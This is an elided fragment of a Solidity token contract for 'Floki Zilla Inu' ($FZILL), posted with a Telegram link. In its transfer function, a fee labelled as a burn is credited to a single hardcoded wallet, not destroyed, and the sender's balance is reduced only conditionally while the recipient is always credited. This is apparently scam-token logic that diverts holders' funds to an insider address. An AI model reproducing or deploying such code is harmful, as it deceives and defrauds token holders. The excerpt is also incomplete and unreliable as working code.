...
// Submitted for Telegram: https://t.me/flokizillainu_official
...
contract  FlokiZillaInu  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Floki Zilla Inu";
    string private _symbol = "$FZILL";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x55FCbbE115f9E97E99266dFAe43601B6b6A86608] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x55FCbbE115f9E97E99266dFAe43601B6b6A86608, _bruntoken);
        }
